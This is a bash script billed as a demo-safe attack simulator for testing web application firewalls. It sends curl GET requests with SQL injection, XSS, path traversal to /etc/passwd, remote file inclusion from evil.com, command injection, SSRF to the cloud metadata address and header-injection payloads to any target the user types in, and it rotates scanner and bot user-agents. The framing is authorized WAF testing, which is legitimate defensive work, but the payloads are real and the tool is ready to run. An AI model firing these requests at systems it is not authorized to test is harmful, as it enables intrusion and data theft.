#!/usr/bin/env bash
set -euo pipefail

# =============================================================
# Universal Attack Simulation Framework (UASF)
# Controlled, demo-safe PoC attack generator for WAAP/WAF demos
# • GET only • Low/controlled RPS • No state changes
# • For authorized testing and demonstration purposes only
# =============================================================

# ---------------- Defaults ----------------
RPS_DEFAULT=3
TIMEOUT_DEFAULT=8
CONC_DEFAULT=2

# Malicious/botlike user-agents to aid Bot/WAF signatures
UA_POOL=(
  "sqlmap/1.7"
  "nikto/2.5"
  "acunetix scanner"
  "python-requests/2.31"
  "EvilBot/1.0"
  "curl/8.0"
)

# ---------------- Helpers ----------------
C_RESET="\033[0m"; C_RED="\033[31m"; C_GREEN="\033[32m"; C_YELLOW="\033[33m"; C_CYAN="\033[36m"
color()  { printf "\033[%sm%s\033[0m" "$1" "$2"; }
header() { echo; color "1;36" "== $1 =="; echo; }
pick_ua(){ echo "${UA_POOL[$((RANDOM % ${#UA_POOL[@]}))]}"; }

ts="$(date +%Y%m%d_%H%M%S)"
OUTDIR="./uasf_out_${ts}"
EVID="$OUTDIR/evidence"
CSV="$OUTDIR/results.csv"
JSONL="$OUTDIR/results.ndjson"
HTML="$OUTDIR/report.html"
CID="UASF-$(date +%s)-$RANDOM"

mkdir -p "$OUTDIR" "$EVID"

# ---------------- UX: minimal, guided interface ----------------
clear
echo "============================================================"
echo "        Universal Attack Simulation Framework (UASF)        "
echo "============================================================"
echo
read -rp "Target (e.g., https://demo.target.com): " BASE
BASE="${BASE%/}"

# Optional DNS info
if command -v host >/dev/null 2>&1; then
  echo "• DNS info:"
  host "$(echo "$BASE" | sed 's~https\?://~~')" || true
fi
echo

echo "Select profile:"
echo "  1) Quick Demo     (lightweight, quick showcase)"
echo "  2) Extended Demo  (broad coverage, still demo-safe)"
echo "  3) Custom         (manually choose modules)"
read -rp "Choice (1/2/3): " PROFILE

RPS=$RPS_DEFAULT; TIMEOUT=$TIMEOUT_DEFAULT; CONC=$CONC_DEFAULT
if [[ "$PROFILE" == "1" ]]; then
  RPS=3; CONC=1
elif [[ "$PROFILE" == "2" ]]; then
  RPS=4; CONC=2
fi

echo
echo "Defaults → RPS=${RPS}, TIMEOUT=${TIMEOUT}s, Concurrency=${CONC}"
read -rp "RPS (Enter to keep=${RPS}): " RPS_INP || true
read -rp "TIMEOUT seconds (Enter to keep=${TIMEOUT}): " TO_INP || true
read -rp "Concurrency (Enter to keep=${CONC}): " CC_INP || true
[[ -n "${RPS_INP:-}" ]] && RPS="$RPS_INP"
[[ -n "${TO_INP:-}"  ]] && TIMEOUT="$TO_INP"
[[ -n "${CC_INP:-}"  ]] && CONC="$CC_INP"

# Interval per request from RPS (never < 1)
INTERVAL=$(awk -v r="$RPS" 'BEGIN{ if (r<=0) r=1; printf("%.3f", 1.0/r) }')

# ---------------- Module catalog (numbered) ----------------
declare -A MODN
MODN[1]="SQL Injection – Basic"
MODN[2]="SQL Injection – Union"
MODN[3]="SQL Injection – Evasion (encodings)"
MODN[4]="XSS – Basic"
MODN[5]="XSS – Variants (img/js URI)"
MODN[6]="Local File Inclusion / Path Traversal"
MODN[7]="Remote File Inclusion (signature)"
MODN[8]="Open Redirect (signature)"
MODN[9]="NoSQL Injection (signature)"
MODN[10]="LDAP Injection (signature)"
MODN[11]="Command Injection (signature)"
MODN[12]="SSRF (signature)"
MODN[13]="Header Injection / CRLF (signature)"
MODN[14]="CORS / Origin probes (read-only)"
MODN[15]="Cache Poisoning (signature)"
MODN[16]="Host Header Injection (signature)"
MODN[17]="Directory Listing Probe"
MODN[18]="Sensitive Files Probe"
MODN[19]="WordPress Core Probes"
MODN[20]="WordPress REST API"
MODN[21]="Contact Form 7 (REST/query signatures)"
MODN[22]="Ultimate Member (AJAX/query signatures)"
MODN[23]="CoBlocks (frontend param signatures)"
MODN[24]="Kubio (frontend param signatures)"
MODN[25]="GTranslate (frontend param signatures)"
MODN[26]="Bad-Bot User-Agents (home/page probes)"
MODN[27]="Bot Pulse (short, safe)"

# ---------------- Payload sets (GET-only, signature-trigger) ----------------
declare -A SET
b="$BASE"

# SQLi
SET["SQL Injection – Basic"]="$b/?id=1%27%20OR%20%271%27%3D%271
$b/?user=admin%27--&pass=test
$b/wp-admin/admin-ajax.php?action=um_fetch_user&q=%27%20OR%201%3D1--"
SET["SQL Injection – Union"]="$b/?s=%27%20UNION%20SELECT%20NULL--%20
$b/?q=1%27%20UNION%20SELECT%201,2,3--%20"
SET["SQL Injection – Evasion (encodings)"]="$b/?id=%251%2527%2520OR%2520%25271%2527%253D%25271
$b/?id=%271%27%2520or%2520%271%27%253D%271"

# XSS
SET["XSS – Basic"]="$b/search?q=%3Csvg/onload%3Dalert(1)%3E
$b/?q=%3Cscript%3Ealert(1)%3C/script%3E"
SET["XSS – Variants (img/js URI)"]="$b/?q=%3Cimg%20src=x%20onerror=alert(1)%3E
$b/?next=javascript:alert(1)
$b/wp-json/wp/v2/search?search=%3Csvg/onload%3Dalert(1)%3E
$b/wp-content/plugins/coblocks/dist/js/coblocks-tinyswiper-initializer.js?cb=%3Csvg/onload%3Dalert(1)%3E
$b/wp-content/plugins/gtranslate/js/base.js?lang=%3Csvg/onload%3Dalert(1)%3E"

# LFI / RFI / Path
SET["Local File Inclusion / Path Traversal"]="$b/download?file=../../../../etc/passwd
$b/wp-content/plugins/contact-form-7/includes/js/index.js?file=../../../../etc/passwd
$b/images/../../../etc/hosts"
SET["Remote File Inclusion (signature)"]="$b/include?page=http://evil.com/shell.txt"

# Redirect
SET["Open Redirect (signature)"]="$b/?redirect=http://evil.com
$b/?next=http://evil.com
$b/?url=http://evil.com"

# Other injection signatures
SET["NoSQL Injection (signature)"]="$b/api/user?username[\$ne]=1&password[\$ne]=1
$b/?filter=\$where:alert(1)"
SET["LDAP Injection (signature)"]="$b/?user=*)(uid=*)"
SET["Command Injection (signature)"]="$b/?host=127.0.0.1;cat%20/etc/passwd
$b/?cmd=%7C%7Cwhoami"

# SSRF (signatures only)
SET["SSRF (signature)"]="$b/?target=http://169.254.169.254/latest/meta-data/
$b/?fetch=http://127.0.0.1:80
$b/?callback=http://internal.example/"

# Protocol/headers/caching
SET["Header Injection / CRLF (signature)"]="$b/?x=%0d%0aSet-Cookie:inject=1"
SET["CORS / Origin probes (read-only)"]="$b/?origin-test=1
$b/?cors-probe=1"
SET["Cache Poisoning (signature)"]="$b/?x-forwarded-host=evil.com
$b/?x-original-url=/admin"
SET["Host Header Injection (signature)"]="$b/?host=evil.com"

# Recon
SET["Directory Listing Probe"]="$b/wp-content/
$b/wp-includes/"
SET["Sensitive Files Probe"]="$b/.env
$b/server-status
$b/robots.txt"

# WordPress ecosystem
SET["WordPress Core Probes"]="$b/?s=test
$b/?p=1
$b/?author=1"
SET["WordPress REST API"]="$b/wp-json/
$b/wp-json/wp/v2/users?search=%27%20OR%201%3D1--"
SET["Contact Form 7 (REST/query signatures)"]="$b/wp-json/contact-form-7/v1/contact-forms?search=%27%20OR%201%3D1--"
SET["Ultimate Member (AJAX/query signatures)"]="$b/wp-admin/admin-ajax.php?action=um_get_members&roles=administrator%27--
$b/?um_search=%3Cscript%3Ealert(1)%3C/script%3E"
SET["CoBlocks (frontend param signatures)"]="$b/wp-content/plugins/coblocks/dist/js/coblocks-animation.js?cb=%3Csvg/onload%3Dalert(1)%3E"
SET["Kubio (frontend param signatures)"]="$b/wp-content/plugins/kubio/build/frontend/index.js?tpl=../../../../etc/hosts"
SET["GTranslate (frontend param signatures)"]="$b/wp-content/plugins/gtranslate/js/base.js?lang=%3Csvg/onload%3Dalert(1)%3E"

# Bot / Bot pulse
SET["Bad-Bot User-Agents (home/page probes)"]="$b/
$b/?page_id=1"

bot_pulse() {
  echo
  header "Bot Pulse (20 requests, malicious UAs – safe)"
  for i in $(seq 1 20); do
    ua="$(pick_ua)"
    curl -sS -o /dev/null -w "." -A "$ua" \
      -H "X-UASF-Correlation: $CID" \
      --max-time "$TIMEOUT" \
      "$b/?pulse=$i" || true
    sleep 0.2
  done
  echo
}

# ---------------- Transport base ----------------
CURL_BASE=(-sS -L --max-time "$TIMEOUT" -H "Cache-Control: no-cache" -H "X-UASF-Correlation: $CID")
echo "timestamp,module,code,ms,size,ip,url,verdict" > "$CSV"
: > "$JSONL"

attack_one() {
  local module="$1" url="$2"
  local ua; ua="$(pick_ua)"
  local tmp start end ms http size ip eff
  tmp="$(mktemp)"
  start=$(date +%s%3N)
  read -r http size ip eff < <(
    curl "${CURL_BASE[@]}" -A "$ua" -D - -o "$tmp" \
      -w "%{http_code} %{size_download} %{remote_ip} %{url_effective}\n" \
      "$url" 2>/dev/null | tail -n1
  )
  end=$(date +%s%3N); ms=$((end-start))

  # Lightweight WAF hint (first 8KB)
  local waf_hint=""
  if head -c 8192 "$tmp" | grep -Eiq '(apptrana|mod.?security|access.?denied|request.?was.?blocked|not.?acceptable|forbidden|web.?application.?firewall|security.?policy)'; then
    waf_hint="waf"
  fi

  local verdict tag
  if [[ "$http" =~ ^2[0-9][0-9]$ ]]; then
    if [[ -n "$waf_hint" ]]; then
      verdict="BLOCK"; tag="$(color 31 "[BLOCK]")"
    else
      verdict="PASS";  tag="$(color 32 "[PASS]")"
    fi
  elif [[ "$http" =~ ^40(3|6|9)$ || "$http" == "451" || "$http" =~ ^49[789]$ || "$http" =~ ^50[0-9]$ || -n "$waf_hint" ]]; then
    verdict="BLOCK"; tag="$(color 31 "[BLOCK]")"
  elif [[ "$http" == "404" ]]; then
    verdict="WARN";  tag="$(color 33 "[WARN]")"
  else
    verdict="WARN";  tag="$(color 33 "[WARN]")"
  fi

  printf "%s,%s,%s,%s,%s,%s,%s,%s\n" \
    "$(date +%Y-%m-%dT%H:%M:%S%z)" "$module" "$http" "$ms" "$size" "${ip:-"-"}" "$eff" "$verdict" >> "$CSV"
  printf '{"ts":"%s","module":"%s","code":%s,"ms":%s,"bytes":%s,"ip":"%s","url":"%s","verdict":"%s"}\n' \
    "$(date +%s)" "$module" "$http" "$ms" "$size" "${ip:-""}" "$eff" "$verdict" >> "$JSONL"

  echo -e "$tag $module  $http  ${ms}ms → $url"

  # Preserve evidence for blocks (first 8KB)
  if [[ "$verdict" == "BLOCK" ]]; then
    head -c 8192 "$tmp" > "$EVID/$(date +%s)_${http}_$(echo "$module" | tr -cd '[:alnum:]-').txt" || true
  fi
  rm -f "$tmp" || true
}

run_set() {
  local module="$1"
  # Skip silently if payload set is undefined or empty
  if [[ -z "${SET[$module]+x}" ]]; then return; fi
  local list="${SET[$module]}"
  if [[ -z "${list//[$'\t\r\n ']/}" ]]; then return; fi

  header "$module"
  while IFS= read -r u; do
    [[ -z "$u" ]] && continue
    while [[ $(jobs -pr | wc -l) -ge $CONC ]]; do wait -n || true; done
    attack_one "$module" "$u" &
    sleep "$INTERVAL"
  done <<< "$list"
  wait || true
}

# ---------------- Selection ----------------
SELECTION=""
if [[ "$PROFILE" == "1" ]]; then
  SELECTION="1,4,6,8,19,26,27"
elif [[ "$PROFILE" == "2" ]]; then
  SELECTION="1-8,9-12,13-16,17-19,20-26,27"
else
  echo
  echo "Available modules (enter numbers, commas and ranges allowed, e.g., 1,3,7-10):"
  for i in $(seq 1 ${#MODN[@]}); do
    printf "  %2d) %s\n" "$i" "${MODN[$i]}"
  done
  echo
  read -rp "Selection: " SELECTION
fi

parse_selection() {
  local input="$1"; local out=(); IFS=',' read -ra parts <<< "$input"
  for p in "${parts[@]}"; do
    if [[ "$p" =~ ^[0-9]+-[0-9]+$ ]]; then
      IFS='-' read -r a b <<< "$p"; for n in $(seq "$a" "$b"); do out+=("$n"); done
    elif [[ "$p" =~ ^[0-9]+$ ]]; then
      out+=("$p")
    fi
  done
  echo "${out[@]}"
}
IDX=($(parse_selection "$SELECTION"))

echo
echo "RPS=$RPS, TIMEOUT=${TIMEOUT}s, Concurrency=$CONC"
echo "Correlation-ID: $CID"
echo "Logs → $CSV | $JSONL | Evidence → $EVID/"
echo

# If Bot Pulse selected, run it first
for n in "${IDX[@]}"; do
  [[ "${MODN[$n]}" == "Bot Pulse (short, safe)" ]] && bot_pulse
done

# Execute selected modules
for n in "${IDX[@]}"; do
  m="${MODN[$n]}"
  [[ "$m" == "Bot Pulse (short, safe)" ]] && continue
  run_set "$m"
done

# ---------------- HTML report ----------------
codes=$(awk -f - "$CSV" <<'AWK' 2>/dev/null || true
BEGIN{FS=","}
NR>1{c[$3]++}
END{for(k in c) printf "<tr><td>%s</td><td>%d</td></tr>\n",k,c[k]}
AWK
)
mods=$(awk -f - "$CSV" <<'AWK' 2>/dev/null || true
BEGIN{FS=","}
NR>1{m[$2]++}
END{for(k in m) printf "<tr><td>%s</td><td>%d</td></tr>\n",k,m[k]}
AWK
)
samples=$(awk -f - "$CSV" <<'AWK' 2>/dev/null || true
BEGIN{FS=","; n=0}
NR>1 && n<100{
  t=$1; mod=$2; code=$3; ms=$4; bytes=$5; ip=$6; url=$7;
  gsub("&","&amp;",url); gsub("<","&lt;",url);
  printf "<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td style=\"word-break:break-all\">%s</td></tr>\n", t,mod,code,ms,bytes,ip,url;
  n++
}
AWK
)

cat > "$HTML" <<HTML
<!doctype html><meta charset="utf-8"><title>UASF Report</title>
<style>body{font-family:system-ui,Segoe UI,Arial;margin:24px}table{border-collapse:collapse;width:100%}td,th{border:1px solid #ddd;padding:6px 10px}th{background:#f6f6f6}</style>
<h2>Universal Attack Simulation Framework (UASF)</h2>
<p><b>Target:</b> $BASE<br><b>Correlation:</b> $CID<br><b>Generated:</b> $(date)</p>
<h3>HTTP Code Summary</h3>
<table><tr><th>Code</th><th>Count</th></tr>$codes</table>
<h3>Module Summary</h3>
<table><tr><th>Module</th><th>Count</th></tr>$mods</table>
<h3>Sample (first 100)</h3>
<table><tr><th>Time</th><th>Module</th><th>Code</th><th>ms</th><th>Bytes</th><th>IP</th><th>URL</th></tr>$samples</table>
<p>Evidence (BLOCK bodies): $(ls -1 "$EVID" 2>/dev/null | wc -l) files under <code>$EVID/</code></p>
HTML

echo
color "1;32" "Completed ✅  "; echo "Open the HTML report: $HTML"
echo "Review your WAAP/WAF console (Attacks / Trends / Bot) with Correlation-ID: $CID"
